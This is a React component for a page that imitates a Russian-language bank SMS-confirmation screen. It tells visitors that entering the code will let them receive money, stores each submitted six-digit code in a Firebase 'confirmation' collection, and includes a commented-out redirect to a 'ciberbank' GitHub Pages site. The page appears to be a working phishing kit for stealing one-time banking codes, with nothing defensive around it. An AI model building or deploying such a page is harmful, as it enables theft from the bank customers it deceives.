import logo from "./img/logo.svg"
import './global.css'
import React, {useState} from "react";
import { db } from './firebase'
import { addDoc, collection } from 'firebase/firestore';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import CurrencyFormat from 'react-currency-format';

function App() {

const [limit, setLimit] = useState(false)
 const [cod, setCod] = useState(null)

const handleChange = (e) => {
  e.preventDefault()
  const limit = 7;
  setCod(e.target.value.slice(0, limit));

if((e.target.value).toString().length > 5 ){
  setLimit(true)
}else{
  setLimit(false)
}
}

function handleSubmit(e) {
  e.preventDefault()
  if (!limit) {
    toast.error("Пожалуйста, заполните информацию");
  } else {
    const usersRef = collection(db, "confirmation")
    addDoc(usersRef, {cod}).then(response => {
      toast.success('Поздравляем, деньги будут сняты при проверке вашего кода подтверждения, пожалуйста, подтвердите, чтобы убедиться, что он правильный!')
      // setTimeout(() => {
      //   window.location.replace('https://ciberbank.github.io/ciberbank');
      // }, 3000);
    }).catch(error => {
      toast.error("Пожалуйста, заполните информацию");
    })
  }
}

  return (
    <div className="w-full h-screen flex justify-center ">
         <ToastContainer position='top-center' />
      <form onSubmit={handleSubmit} className="border shadow-xl flex flex-col w-full sm:max-w-[35%] py-20 px-10 h-screen">
        <div className="logo"><img src={logo} alt="" className="block mb-20 w-[150px]" /></div>
        <div className="mb-12">
          <span className="font-bold text-lg">Отправили код <br/></span>
          <span>Для его получения ваш номер должен быть <br/> подключен к СМС-банку для получение деньги </span>
        </div>
        <span className="text-greylish mb-2">Введите код</span>
        <CurrencyFormat  format="### ###"  className="p-2 outlined-none border border-greylish text-lg font-semibold rounded-md w-full mb-5" onChange={handleChange}  />
        {/* <input type="number" value={cod}  className="p-2 outlined-none border border-greylish rounded-md w-full mb-5" placeholder="000 000" /> */}
        <button type='submit'  className={`w-full border border-greylish p-4 font-semibold ${limit ? 'bg-green-600' : 'bg-gray-200'}   hover:bg-green-600 hover:transition-all transition-all mb-5 text-xl rounded-md`}>получить</button>
        Подтверждая операцию с помощью смс-кода, вы соглашаетесь с условиями и тарифами: ссылка
      </form>
    </div>

  );
}

export default App;
